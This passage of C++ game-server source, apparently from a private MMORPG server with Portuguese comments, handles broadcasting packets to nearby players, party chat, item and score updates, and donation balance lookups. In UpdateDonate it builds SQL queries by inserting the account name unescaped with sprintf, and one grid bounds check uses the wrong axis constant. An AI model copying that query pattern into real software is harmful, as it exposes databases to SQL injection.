//					SendRemoveMob(conn, tmob, 0, 0);
//			}
//		}
//	}
//
//
//	for (int y = sy1; y < sy2; y++)
//	{
//		for (int x = sx1; x < sx2; x++)
//		{
//			int titem = pItemGrid[y][x];
//
//			if (titem == 0)
//				continue;
//
//			if (x < tx1 || x >= tx2 || y < ty1 || y >= ty2 && tx)
//			{
//				if (titem > 0 && titem < MAX_ITEM && pItem[titem].Mode && pItem[titem].ITEM.sIndex && conn > 0 && conn < MAX_USER)
//					SendRemoveItem(conn, titem, 0);
//			}
//		}
//	}
//
//	for (int y = ty1; y < ty2; y++)
//	{
//		for (int x = tx1; x < tx2; x++)
//		{
//			int titem = pItemGrid[y][x];
//			tmob = pMobGrid[y][x];
//
//			if (x < sx1 || x >= sx2 || y < sy1 || y >= sy2)
//			{
//				if (titem > 0 && titem < MAX_ITEM && pItem[titem].Mode && pItem[titem].ITEM.sIndex && conn < MAX_USER)
//				{
//					if (pItem[titem].Mode)
//						SendCreateItem(conn, titem, 0);
//
//					else
//						pItemGrid[y][x] = 0;
//				}
//
//				if (tmob != conn && tmob)
//				{
//					if (pMob[tmob].Mode == MOB_EMPTY)
//					{
//						pMobGrid[y][x] = 0;
//
//						char cLog[128];
//
//						/*if (tmob < MAX_USER)
//							sprintf_s(cLog, "MOB GRID HAS EMPTY MOB [MobName: %s] [tmob: %d]", pMob[tmob].MOB.MobName, tmob);
//						else
//							sprintf_s(cLog, "MOB GRID HAS EMPTY MOB [MobName: %s] [tmob: %d]", mNPCGen.pList->Leader.MobName, tmob);
//
//						Log(cLog, "-system", 0);*/
//
//						continue;
//					}
//
//					if (tmob < MAX_USER)
//					{
//						if (pMob[conn].Mode == MOB_EMPTY)
//							pMobGrid[y][x] = 0;
//						else
//						{
//							SendCreateMob(tmob, conn, 0);
//							SendPKInfo(tmob, conn);
//						}
//					}
//
//					if (conn < MAX_USER)
//					{
//						if (pMob[tmob].Mode == MOB_EMPTY)
//							pMobGrid[y][x] = 0;
//						else
//						{
//							SendCreateMob(conn, tmob, 0);
//							SendPKInfo(conn, tmob);
//						}
//					}
//
//					if (msg != NULL && tmob > 0 && tmob < MAX_USER)
//					{
//						if (pUser[tmob].cSock.AddMessage((char*)msg, msg->Size) == 0)
//						{
//							pUser[tmob].AccountName[ACCOUNTNAME_LENGTH - 1] = 0;
//							pUser[tmob].AccountName[ACCOUNTNAME_LENGTH - 2] = 0;
//
//							//sprintf(temp, "err,gridmulticast add %d-%d %s", tmob, pUser[tmob].Mode, pUser[tmob].AccountName);
//							//Log(temp, "-system", 0);
//						}
//					}
//				}
//			}
//		}
//	}
//
//	MSG_Action *sm = (MSG_Action*)msg;
//
//	pMob[conn].LastTime = sm->ClientTick;
//	pMob[conn].LastSpeed = sm->Speed;
//
//	pMob[conn].LastX = sm->PosX;
//	pMob[conn].LastY = sm->PosY;
//
//	pMob[conn].TargetX = tx;
//	pMob[conn].TargetY = ty;
//}

//novo do over
void GridMulticast(int Index, unsigned int posX, unsigned int posY, MSG_STANDARD* msg)
{
	if (Index <= 0 || Index >= MAX_MOB)
		return;

	if (Index == 0 || pMob[Index].TargetX == 0)
		return;

	CMob* mob = (CMob*)&pMob[Index];

	INT32 mobId = pMobGrid[mob->TargetY][mob->TargetX];
	if (mobId == Index && mobId != 0)
		pMobGrid[mob->TargetY][mob->TargetX] = 0;

	if (pMobGrid[posY][posX] != Index && pMobGrid[posY][posX] != 0)
		GetEmptyMobGrid(Index, &pMob[Index].TargetX, &pMob[Index].TargetY);

	pMobGrid[posY][posX] = Index;

	int VisX = VIEWGRIDX, VisY = VIEWGRIDY,
		minPosX = (mob->TargetX - HALFGRIDX),
		minPosY = (mob->TargetY - HALFGRIDY);

	if ((minPosX + VisX) >= MAX_GRIDX)
		VisX = (VisX - (VisX + minPosX - MAX_GRIDX));

	if ((minPosY + VisY) >= MAX_GRIDY)
		VisY = (VisY - (VisY + minPosY - MAX_GRIDY));

	if (minPosX < 0)
	{
		minPosX = 0;
		VisX = (VisX + minPosX);
	}

	if (minPosY < 0)
	{
		minPosY = 0;
		VisY = (VisY + minPosY);
	}

	int maxPosX = (minPosX + VisX),
		maxPosY = (minPosY + VisY);

	int dVisX = VIEWGRIDX, dVisY = VIEWGRIDY,
		dminPosX = (posX - HALFGRIDX),
		dminPosY = (posY - HALFGRIDY);

	if ((dminPosX + dVisX) >= MAX_GRIDX)
		dVisX = (dVisX - (dVisX + dminPosX - MAX_GRIDX));

	if ((dminPosY + dVisY) >= MAX_GRIDY)
		dVisY = (dVisY - (dVisY + dminPosY - MAX_GRIDY));

	if (dminPosX < 0)
	{
		dminPosX = 0;
		dVisX = (dVisX + dminPosX);
	}

	if (dminPosY < 0)
	{
		dminPosY = 0;
		dVisY = (dVisY + dminPosY);
	}

	int dmaxPosX = (dminPosX + dVisX),
		dmaxPosY = (dminPosY + dVisY);

	for (int nY = minPosY; nY < maxPosY; nY++)
	{
		for (int nX = minPosX; nX < maxPosX; nX++)
		{
			short mobID = pMobGrid[nY][nX];
			if (mobID > 0 && Index != mobID)
			{
				if (msg != NULL && mobID < MAX_USER)
					pUser[mobID].cSock.SendOneMessage((char*)msg, *(short*)&msg[0]);

				if (nX < dminPosX || nX >= dmaxPosX ||
					nY < dminPosY || nY >= dmaxPosY)
				{
					if (mobID < MAX_USER)
						SendRemoveMob(mobID, Index, 0, 0);

					if (Index < MAX_USER)
						SendRemoveMob(Index, mobID, 0, 0);
				}
			}

			WORD item = pItemGrid[nY][nX];
			if (item != 0)
			{
				if (nX < dminPosX || nX >= dmaxPosX ||
					nY < dminPosY || nY >= dmaxPosY)
				{
					if (item >= 0 && item < 4096 && Index < MAX_USER)
						SendRemoveItem(Index, item, 0);
				}
			}
		}
	}

	for (int nY = dminPosY; nY < dmaxPosY; nY++)
	{
		for (int nX = dminPosX; nX < dmaxPosX; nX++)
		{
			short mobID = pMobGrid[nY][nX];
			short initID = pItemGrid[nY][nX];

			if (nX < minPosX || nX >= maxPosX ||
				nY < minPosY || nY >= maxPosY)
			{
				if (mobID > 0 && Index != mobID)
				{
					if (pMob[mobID].Mode == 0)
					{
						pMobGrid[nY][nX] = 0;

						continue;
					}

					if (Index < MAX_USER)
						SendCreateMob(Index, mobID, 0);

					if (mobID < MAX_USER)
						SendCreateMob(mobID, Index, 0);

					if (msg != NULL && mobID < MAX_USER)
						pUser[mobID].cSock.SendOneMessage((char*)msg, *(short*)&msg[0]);

				}

				if (initID > 0 && Index > 0 && Index < MAX_USER)
					SendCreateItem(Index, initID, 0);

				if (initID > 0 && mobID > 0 && mobID < MAX_USER)
					SendCreateItem(mobID, initID, 0);
			}
		}
	}

	MSG_Action* pAction = (MSG_Action*)msg;

	mob->LastTime = pAction->ClientTick;
	mob->LastSpeed = pAction->Speed;
	mob->LastX = pAction->PosX;
	mob->LastY = pAction->PosY;

	mob->TargetX = posX;
	mob->TargetY = posY;
}

void SendEmotion(int conn, int Motion, int Parm)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_Motion sm;
	memset(&sm, 0, sizeof(MSG_Motion));

	sm.Type = _MSG_Motion;
	sm.Size = sizeof(MSG_Motion);

	sm.NotUsed = 0;

	sm.ID = conn;

	sm.Motion = Motion;
	sm.Parm = Parm;

	GridMulticast(pMob[conn].TargetX, pMob[conn].TargetY, (MSG_STANDARD*)&sm, 0);
}


//void GridMulticast(int tx, int ty, MSG_STANDARD *msg, int skip)
//{
//	int SizeY = VIEWGRIDY;
//	int SizeX = VIEWGRIDX;
//	int StartX = tx - HALFGRIDX;
//	int StartY = ty - HALFGRIDY;
//
//	if (StartX + SizeX >= MAX_GRIDX)
//		SizeX = SizeX - (StartX + SizeX - MAX_GRIDX);
//
//	if (SizeY + StartY >= MAX_GRIDY)
//		SizeY = SizeY - (StartY + SizeY - MAX_GRIDY);
//
//	if (StartX < 0)
//	{
//		StartX = 0;
//
//		SizeX = SizeX + StartX;
//	}
//
//	if (StartY < 0)
//	{
//		StartY = 0;
//
//		SizeY = SizeY + StartY;
//	}
//
//	int sx1 = StartX;
//	int sy1 = StartY;
//	int sx2 = StartX + SizeX;
//	int sy2 = StartY + SizeY;
//
//	for (int y = sy1; y < sy2; y++)
//	{
//		for (int x = sx1; x < sx2; x++)
//		{
//			int tmob = pMobGrid[y][x];
//
//			if (tmob <= 0 || tmob == skip)
//				continue;
//
//			if (pMob[tmob].Mode == MOB_EMPTY)
//			{
//				int Unk = 0;
//
//				continue;
//			}
//
//			if (msg != NULL && tmob < MAX_USER)
//			{
//				if (msg->Type == _MSG_CreateMob)
//				{
//					int xx = ((MSG_CreateMob*)msg)->PosX;
//					int yy = ((MSG_CreateMob*)msg)->PosY;
//
//					if (xx >= 896 && yy >= 1405 && xx <= 1150 && yy <= 1538)
//					{
//						STRUCT_ITEM hcitem;
//
//						memset(&hcitem, 0, sizeof(STRUCT_ITEM));
//
//						hcitem.sIndex = 3505;
//
//						((MSG_CreateMob*)msg)->Equip[1] = BASE_VisualItemCode(&hcitem, 1);
//
//						((MSG_CreateMob*)msg)->AnctCode[1] = BASE_VisualAnctCode(&hcitem);
//
//
//						hcitem.sIndex = 3999;
//
//						((MSG_CreateMob*)msg)->Equip[15] = BASE_VisualItemCode(&hcitem, 15);
//
//						((MSG_CreateMob*)msg)->AnctCode[15] = BASE_VisualAnctCode(&hcitem);
//					}
//
//				}
//
//				if (msg->Type == _MSG_CNFMobKill)
//				{
//					((MSG_CNFMobKill*)msg)->Exp = pMob[tmob].MOB.Exp;
//					((MSG_CNFMobKill*)msg)->Hold = pMob[tmob].extra.Hold;
//
//					int Segment = pMob[tmob].CheckGetLevel();
//
//					if (Segment >= 1 && Segment <= 4)
//					{
//						if (Segment == 4)
//						{
//							SetCircletSubGod(tmob);
//							SendEtc(tmob);
//							doRanking(tmob);
//							SendMsgExp(tmob, g_pMessageStringTable[_NN_Level_Up], TNColor::Default, false);
//							/*if (pMob[tmob].extra.ClassMaster == MORTAL) {
//								DoItemLevel(tmob);
//								
//							}*/
//						}
//						if (Segment == 3) 
//							SendMsgExp(tmob, "[EXP 3/4]", TNColor::GoldenEscuro, false); // DESCRIÇÃO XP PINHEIRO
//
//						if (Segment == 2) 
//							SendMsgExp(tmob, "[EXP 2/4]", TNColor::GreenYellow, false);
//
//						if (Segment == 1) 
//							SendMsgExp(tmob, "[EXP 1/4]", TNColor::GoldenClaro, false);
//
//						SendScore(tmob);
//						SendEmotion(tmob, 14, 3);
//
//						if (Segment == 4)
//						{
//
//							int PKPoint = GetPKPoint(tmob) + 3;
//							SetPKPoint(tmob, PKPoint);
//
//							int PunicaoCP = GetPKPoint(tmob);
//							if (PunicaoCP > 75) //remove puniçao cp
//							{
//								pMob[tmob].extra.EMPTY[0] = 0;
//								pMob[tmob].GetCurrentScore(tmob);
//								SendScore(tmob);
//
//							}
//
//							if (PunicaoCP > 30  && PunicaoCP <= 74) //remove puniçao cp
//							{
//								pMob[tmob].extra.EMPTY[1] = 0;
//								pMob[tmob].GetCurrentScore(tmob);
//								SendScore(tmob);
//
//							}
//
//							
//							//SendEtc(tmob);
//							MSG_CreateMob sm_lupc;
//							memset(&sm_lupc, 0, sizeof(MSG_CreateMob));
//							GetCreateMob(tmob, &sm_lupc);
//
//							GridMulticast(pMob[tmob].TargetX, pMob[tmob].TargetY, (MSG_STANDARD*)&sm_lupc, 0);
//							//sprintf(temp, "lvl %s level up to %d", pMob[tmob].MOB.MobName, pMob[tmob].MOB.BaseScore.Level);
//							//Log(temp, pUser[tmob].AccountName, pUser[tmob].IP);
//						}
//					}
//				}
//
//				pUser[tmob].cSock.AddMessage((char*)msg, msg->Size);
//				
//			}
//		}
//	}
//}

void GridMulticast(int posX, int posY, MSG_STANDARD* sendPak, int Index)
{
	int VisX = VIEWGRIDX, VisY = VIEWGRIDY,
		minPosX = (posX - HALFGRIDX),
		minPosY = (posY - HALFGRIDY);

	if ((minPosX + VisX) >= MAX_GRIDX)
		VisX = (VisX - (VisX + minPosX - MAX_GRIDX));

	if ((minPosY + VisY) >= MAX_GRIDX)
		VisY = (VisY - (VisY + minPosY - MAX_GRIDX));

	if (minPosX < 0)
	{
		minPosX = 0;
		VisX = (VisX + minPosX);
	}

	if (minPosY < 0)
	{
		minPosY = 0;
		VisY = (VisY + minPosY);
	}

	int maxPosX = (minPosX + VisX),
		maxPosY = (minPosY + VisY);

	for (int nY = minPosY; nY < maxPosY; nY++)
	{
		for (int nX = minPosX; nX < maxPosX; nX++)
		{
			short mobID = pMobGrid[nY][nX];
			if (mobID <= 0 || Index == mobID)
				continue;

			if (sendPak == NULL || mobID >= MAX_USER)
				continue;

			if (pMob[mobID].Mode == 0)
				continue;

			if (sendPak->Type == _MSG_CNFMobKill)
			{
				((MSG_CNFMobKill*)sendPak)->Exp = pMob[mobID].MOB.Exp;
				((MSG_CNFMobKill*)sendPak)->Hold = pMob[mobID].extra.Hold;

				int Segment = pMob[mobID].CheckGetLevel();

				if (Segment >= 1 && Segment <= 4)
				{
					if (Segment == 4)
					{
						SetCircletSubGod(mobID);
						SendEtc(mobID);
						doRanking(mobID);
						SendMsgExp(mobID, g_pMessageStringTable[_NN_Level_Up], TNColor::Default, false);
						/*if (pMob[mobID].extra.ClassMaster == MORTAL) {
							DoItemLevel(mobID);

						}*/
					}
					if (Segment == 3)
						SendMsgExp(mobID, "[EXP 3/4]", TNColor::GoldenEscuro, false); // DESCRIÇÃO XP PINHEIRO

					if (Segment == 2)
						SendMsgExp(mobID, "[EXP 2/4]", TNColor::GreenYellow, false);

					if (Segment == 1)
						SendMsgExp(mobID, "[EXP 1/4]", TNColor::GoldenClaro, false);

					SendScore(mobID);
					SendEmotion(mobID, 14, 3);

					if (Segment == 4)
					{

						int PKPoint = GetPKPoint(mobID) + 3;
						SetPKPoint(mobID, PKPoint);

						int PunicaoCP = GetPKPoint(mobID);
						if (PunicaoCP > 75) //remove puniçao cp
						{
							pMob[mobID].extra.EMPTY[0] = 0;
							pMob[mobID].GetCurrentScore(mobID);
							SendScore(mobID);

						}

						if (PunicaoCP > 30 && PunicaoCP <= 74) //remove puniçao cp
						{
							pMob[mobID].extra.EMPTY[1] = 0;
							pMob[mobID].GetCurrentScore(mobID);
							SendScore(mobID);

						}

						MSG_CreateMob sm_lupc;
						memset(&sm_lupc, 0, sizeof(MSG_CreateMob));
						GetCreateMob(mobID, &sm_lupc);

						GridMulticast(pMob[mobID].TargetX, pMob[mobID].TargetY, (MSG_STANDARD*)&sm_lupc, 0);
					}
				}
			}

			pUser[mobID].cSock.SendOneMessage((char*)sendPak, sendPak->Size);
		}
	}
}

void PartyGridMulticast(int tx, int ty, MSG_STANDARD *msg, int skip, int Leaderconn)
{
	int SizeY = VIEWGRIDY;
	int SizeX = VIEWGRIDX;
	int StartX = tx - HALFGRIDX;
	int StartY = ty - HALFGRIDY;

	if (StartX + SizeX >= MAX_GRIDX)
		SizeX = SizeX - (StartX + SizeX - MAX_GRIDX);

	if (SizeY + StartY >= MAX_GRIDY)
		SizeY = SizeY - (StartY + SizeY - MAX_GRIDY);

	if (StartX < 0)
		StartX = 0;

	if (StartY < 0)
		StartY = 0;

	int sx1 = StartX;
	int sy1 = StartY;
	int sx2 = StartX + SizeX;
	int sy2 = StartY + SizeY;

	for (int y = StartY; y < sy2; y++)
	{
		for (int x = sx1; x < sx2; x++)
		{
			int tmob = pMobGrid[y][x];

			if (tmob <= 0 || tmob == Leaderconn)
				continue;

			if (!Leaderconn || pMob[tmob].Leader != Leaderconn)
			{
				if (pMob[tmob].Mode == MOB_EMPTY)
				{
					int Unk = 0;

					continue;
				}

				if (msg != NULL && tmob < MAX_USER && tmob != skip && !pUser[tmob].PartyChat)
				{
					if (pUser[tmob].Mode != USER_PLAY || pUser[tmob].cSock.Sock == 0)
						continue;

					if (!pUser[tmob].cSock.AddMessage((char*)msg, msg->Size))
						CloseUser(tmob);
				}
			}
		}
	}

	if (Leaderconn > 0 && Leaderconn < MAX_USER && pUser[Leaderconn].Mode == USER_PLAY)
	{
		if (Leaderconn != skip)
			pUser[Leaderconn].cSock.AddMessage((char*)msg, msg->Size);

		for (int i = 0; i < MAX_PARTY; i++)
		{
			int partyconn = pMob[Leaderconn].PartyList[i];

			if (partyconn <= 0 || partyconn >= MAX_USER)
				continue;

			if (partyconn == skip)
				continue;

			if (pUser[partyconn].Mode != USER_PLAY || pUser[partyconn].PartyChat != 0)
				continue;

			if (pUser[partyconn].Mode != USER_PLAY || pUser[partyconn].cSock.Sock == 0)
				continue;

			if (!pUser[partyconn].cSock.AddMessage((char*)msg, msg->Size))
				CloseUser(partyconn);
		}
	}
}

void SendItem(int conn, int Type, int Slot, STRUCT_ITEM *item)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_SendItem sm_si;
	memset(&sm_si, 0, sizeof(MSG_SendItem));

	sm_si.Type = _MSG_SendItem;
	sm_si.Size = sizeof(MSG_SendItem);
	sm_si.ID = conn;

	sm_si.invType = Type;
	sm_si.Slot = Slot;

	memcpy(&sm_si.item, item, sizeof(STRUCT_ITEM));

	int Size = sm_si.Size;

	if (Size > sizeof(MSG_SendItem))
	{
		sm_si.Size = 0;
		return;
	}
	if (!pUser[conn].cSock.AddMessage((char*)&sm_si, sizeof(MSG_SendItem)))
		CloseUser(conn);
}

void SendEquip(int conn, int skip)
{

	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_UpdateEquip sm_ue;
	memset(&sm_ue, 0, sizeof(MSG_UpdateEquip));

	sm_ue.Type = _MSG_UpdateEquip;
	sm_ue.Size = sizeof(MSG_UpdateEquip);
	sm_ue.ID = conn;

	int SendMount = 0;

	for (int i = 0; i < MAX_EQUIP; i++)
	{
		STRUCT_ITEM *item = &pMob[conn].MOB.Equip[i];

		sm_ue.Equip[i] = BASE_VisualItemCode(item, i);

		sm_ue.AnctCode[i] = BASE_VisualAnctCode(item);

		if (i == 14 && sm_ue.Equip[14] >= 2360 && sm_ue.Equip[i] < 2390 && pMob[conn].MOB.Equip[i].stEffect[0].sValue <= 0)
		{
			sm_ue.Equip[i] = 0;

			SendMount = 1;

			continue;
		}

		if (i == 14 && sm_ue.Equip[14] >= 2360 && sm_ue.Equip[i] < 2390)
		{
			int MountLevel = pMob[conn].MOB.Equip[i].stEffect[1].cEffect; // level

			MountLevel /= 10;

			if (MountLevel > 13)
				MountLevel = 13;
			if (MountLevel < 0)
				MountLevel = 0;

			MountLevel = MountLevel * 4096;
			sm_ue.Equip[i] += MountLevel;

			continue;
		}
	}

	GridMulticast(pMob[conn].TargetX, pMob[conn].TargetY, (MSG_STANDARD*)&sm_ue, skip);

	if (SendMount != 0)
		SendItem(conn, ITEM_PLACE_EQUIP, 14, &pMob[conn].MOB.Equip[14]);
}


void SendScore(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;


	MSG_UpdateScore sm_vus;
	memset(&sm_vus, 0, sizeof(MSG_UpdateScore));

	sm_vus.Type = _MSG_UpdateScore;

	if (conn < MAX_USER)
	{
		sm_vus.CurrHp = pMob[conn].MOB.CurrentScore.Hp;
		sm_vus.CurrMp = pMob[conn].MOB.CurrentScore.Mp;
	}

	sm_vus.Size = sizeof(MSG_UpdateScore);
	sm_vus.ID = conn;

	memcpy(&sm_vus.Score, &pMob[conn].MOB.CurrentScore, sizeof(STRUCT_SCORE));

	sm_vus.Critical = pMob[conn].MOB.Critical;
	sm_vus.SaveMana = pMob[conn].MOB.SaveMana;
	sm_vus.Guild = pMob[conn].MOB.Guild;
	sm_vus.GuildLevel = pMob[conn].MOB.GuildLevel;

	GetAffect(sm_vus.Affect, pMob[conn].Affect);

	sm_vus.Resist[0] = pMob[conn].MOB.Resist[0];
	sm_vus.Resist[1] = pMob[conn].MOB.Resist[1];
	sm_vus.Resist[2] = pMob[conn].MOB.Resist[2];
	sm_vus.Resist[3] = pMob[conn].MOB.Resist[3];

	sm_vus.Special[0] = 0xCC;
	sm_vus.Special[1] = 0xCC;
	sm_vus.Special[2] = 0xCC;
	sm_vus.Special[3] = 0xCC;

	sm_vus.Magic = pMob[conn].MOB.Magic;

	if (pMob[conn].GuildDisable)
		sm_vus.Guild = 0;

	if (BrState != 0)
	{
		if (conn < MAX_USER)
		{
			int posX = pMob[conn].TargetX;
			int posY = pMob[conn].TargetY;

			if (posX >= 2604 && posY >= 1708 && posX <= 2648 && posY <= 1744)
			{
				sm_vus.Guild = 0;
				sm_vus.GuildLevel = 0;
			}
		}
	}
	GridMulticast(pMob[conn].TargetX, pMob[conn].TargetY, (MSG_STANDARD*)&sm_vus, 0);

	pUser[conn].chave4 = 0;
	SendAffect(conn);
	SendServerInfo(conn);
}
void SellMarket(int ItemId, int Qnt)
{
	int itemIndex = ItemId;

	if (itemIndex == 419) {
		pOriRest -= Qnt * 1;
		if (pOriRest <= 30000)
			pOriRest = 30000;
	}
	if (itemIndex == 429){
		pLacRest -= Qnt * 2;
		if (pLacRest <= 60000)
			pLacRest = 60000;
	}
	if (itemIndex == 412){
		pOriPounder -= Qnt * 12;
		if (pOriPounder <= 600000)
			pOriPounder = 600000;
	}
	if (itemIndex == 413){
		pLacPounder -= Qnt * 14;
		if (pLacPounder <= 1200000)
			pLacPounder = 1200000;
	}
}
void SendServerInfo(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)//18/12
		return;

	if (pUser[conn].cSock.Sock == 0)//18/12
		return;

	MSG_ServerInfos sm;
	memset(&sm, 0, sizeof(MSG_ServerInfos));
	sm.Type = _MSG_ServerInfos;
	sm.Size = sizeof(MSG_ServerInfos);
	sm.ID = conn;

	int Exp = 0;
	int Drop = 0;

	//Fada Verde 3D
	if (pMob[conn].MOB.Equip[13].sIndex == 3900)
		Exp += 16;

	//Fada Azul 3D
	if (pMob[conn].MOB.Equip[13].sIndex == 3901)
		Drop += 32;

	//Fada Vermelha
	if (pMob[conn].MOB.Equip[13].sIndex == 3902 || pMob[conn].MOB.Equip[13].sIndex == 3905 || pMob[conn].MOB.Equip[13].sIndex == 3908)
	{
		Exp += 32;
		Drop += 16;
	}

	//Fada Verde
	if (pMob[conn].MOB.Equip[13].sIndex == 3903 || pMob[conn].MOB.Equip[13].sIndex == 3906 || pMob[conn].MOB.Equip[13].sIndex == 3911 || pMob[conn].MOB.Equip[13].sIndex == 3912 || pMob[conn].MOB.Equip[13].sIndex == 3913)
		Exp += 16;

	//Fada Verde Azul 
	if (pMob[conn].MOB.Equip[13].sIndex == 3904 || pMob[conn].MOB.Equip[13].sIndex == 3907)
		Drop += 32;

	//trajes
	if (pMob[conn].MOB.Equip[12].sIndex >= 4200 && pMob[conn].MOB.Equip[12].sIndex <= 4275)	{
		Exp += 10;
		if ((pMob[conn].MOB.Equip[14].sIndex >= 2360 && pMob[conn].MOB.Equip[14].sIndex <= 2389) && pMob[conn].MOB.Equip[14].stEffect[2].cValue > 0)
			Exp += 5;
	}
	if ((pMob[conn].MOB.Equip[14].sIndex >= 2360 && pMob[conn].MOB.Equip[14].sIndex <= 2389) && pMob[conn].MOB.Equip[14].stEffect[2].cValue > 0) {
		Drop += 10;
		if (pMob[conn].MOB.Equip[12].sIndex >= 4200 && pMob[conn].MOB.Equip[12].sIndex <= 4275)
			Drop += 5;
	}

	//Cidadão
	if (pMob[conn].extra.Citizen == ServerIndex + 1)
		Drop += 10;

	//Kefra Morto
	if (KefraLive != 0) {
		Exp += 10;
		Drop += 20;
	}

	// Bonus Set e Arma
	for (int i = 0; i < 16; i++)
	{
		auto MOB = pMob[conn].MOB;

		int ItemId = MOB.Equip[i].sIndex;
		int itemGem = BASE_GetItemGem(&MOB.Equip[i]);

		int pDrop = 0;
		int pExp = 0;

		if (ItemId <= 0 || ItemId > MAX_ITEMLIST)
			continue;

		if (g_pItemList[ItemId].Grade == 5)
			pDrop += 8;

		if (g_pItemList[ItemId].Grade == 7)
			pExp += 2;

		if (itemGem == 0)
			pDrop += 8;

		if (itemGem == 2)
			pExp += 2;
				
		Drop += pDrop;
		Exp += pExp;
	}

	// Bau de Exp
	for (int i = 1; i < MAX_AFFECT; i++)
	{
		if (pMob[conn].Affect[i].Type == 39) {
			Exp += 100;
			break;
		}
	}

	// Drop por Level
	if (pMob[conn].MOB.Exp >= 100000000 && pMob[conn].extra.Citizen != 0)
	{
		int DropCalculoByExp = pMob[conn].MOB.Exp / 100000000;

		if (DropCalculoByExp > 80)
			DropCalculoByExp = 80;

		Drop += DropCalculoByExp;
	}

	sm.Double = DOUBLEMODE;
	sm.ExpRate = Exp;
	sm.DropRate = Drop;

	int Size = sm.Size;

	if (Size > sizeof(MSG_ServerInfos))
	{
		sm.Size = 0;
		return;
	}

	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_ServerInfos)))
		CloseUser(conn);
}
void SendEtc(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)//18/12
		return;

	if (pUser[conn].cSock.Sock == 0)//18/12
		return;

	MSG_UpdateEtc sm;

	memset(&sm, 0, sizeof(MSG_UpdateEtc));

	sm.Type = _MSG_UpdateEtc;
	sm.Size = sizeof(MSG_UpdateEtc);
	sm.ID = conn;
	sm.Exp = pMob[conn].MOB.Exp;
	sm.SpecialBonus = pMob[conn].MOB.SpecialBonus;
	sm.Learn = pMob[conn].MOB.LearnedSkill;
	sm.SecLearn = pMob[conn].extra.SecLearnedSkill;
	sm.ScoreBonus = pMob[conn].MOB.ScoreBonus;
	sm.SkillBonus = pMob[conn].MOB.SkillBonus;
	sm.Coin = pMob[conn].MOB.Coin;

	sm.Hold = pMob[conn].extra.Hold;
	sm.Magic = pMob[conn].MOB.Magic;
	sm.Honra = pUser[conn].Honra;

	sm.chave1 = pUser[conn].chave1;

	for (int i = 0; i < 50; i++) {
		sm.Keys[i] = pUser[conn].Keys[i];
	}
	sm.Keys[0] = pMob[conn].MOB.BaseScore.Level;

	int Size = sm.Size;

	if (Size > sizeof(MSG_UpdateEtc))
	{		
		sm.Size = 0;
		return;
	}

	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_UpdateEtc)))
		CloseUser(conn);	
}

//Atualiza outras informações do client
void UpdateDonate(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	if (pUser[conn].DonateDelay != 0)
	{
		int isTime = GetTickCount64() - pUser[conn].DonateDelay; // ATRASO PACOTE

		if (isTime < 2000)
		{
			SendClientMessage(conn, "Aguarde 2 segundo para uma nova Tentativa.");
			return;
		}

	}
	pUser[conn].DonateDelay = GetTickCount64();

	MSG_UpdateDonate sm;
	memset(&sm, 0, sizeof(MSG_UpdateDonate));
	sm.Type = _MSG_UpdateDonate;
	sm.Size = sizeof(MSG_UpdateDonate);
	sm.ID = conn;

	auto& pc = cSQL::instance();

	int Donate = 0;
	std::string Pix;

	sprintf(hQuery, "SELECT * FROM `accounts` WHERE `username` = '%s'", pUser[conn].AccountName);
	MYSQL_ROW row;
	MYSQL* wSQL = pc.wStart();
	MYSQL_RES* result = pc.wRes(wSQL, hQuery);

	if (result == NULL)
		return;


	while ((row = mysql_fetch_row(result)) != NULL)
	{
		Donate = atoi(row[6]);
		Pix = row[20];
	}

	if (Pix == "0") {
		GerarPix(conn);

		sprintf(hQuery, "SELECT * FROM `accounts` WHERE `username` = '%s'", pUser[conn].AccountName);
		MYSQL_ROW row;
		MYSQL* wSQL = pc.wStart();
		MYSQL_RES* result = pc.wRes(wSQL, hQuery);

		if (result == NULL)
			return;

		while ((row = mysql_fetch_row(result)) != NULL)
		{
			Pix = row[20];
		}
	}

	sm.Cash = Donate;
	strncpy(sm.Pix, Pix.c_str(), sizeof(sm.Pix));

	int Size = sm.Size;

	if (Size > sizeof(MSG_UpdateDonate))
	{
		sm.Size = 0;
		return;
	}

	if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_UpdateDonate)))
		CloseUser(conn);
}

void SendCargoCoin(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_STANDARDPARM sm_ucc;
	memset(&sm_ucc, 0, sizeof(MSG_STANDARDPARM));

	sm_ucc.Type = _MSG_UpdateCargoCoin;
	sm_ucc.Size = sizeof(MSG_STANDARDPARM);
	sm_ucc.Size = sizeof(MSG_STANDARDPARM);

	sm_ucc.ID = ESCENE_FIELD;

	sm_ucc.Parm = pUser[conn].Coin;

	int Size = sm_ucc.Size;

	if (Size > sizeof(MSG_STANDARDPARM))
	{
		sm_ucc.Size = 0;
		return;
	}

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		if (!pUser[conn].cSock.AddMessage((char*)&sm_ucc, sizeof(MSG_STANDARDPARM)))
			CloseUser(conn);
	}
}

void SendGuildList(int conn)
{
	int Guild = pMob[conn].MOB.Guild;

	if (Guild <= 0)
		return;

	char str[128];

	memset(str, 0, 128);

	int members = 0;
	int max_size = 70;

	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (Guild != pMob[i].MOB.Guild)
			continue;

		members++;

		int len = strlen(str);

		if (len >= max_size)
		{
			SendClientMessage(conn, str);

			memset(str, 0, len);
		}

		pMob[i].MOB.MobName[NAME_LENGTH - 1] = 0;
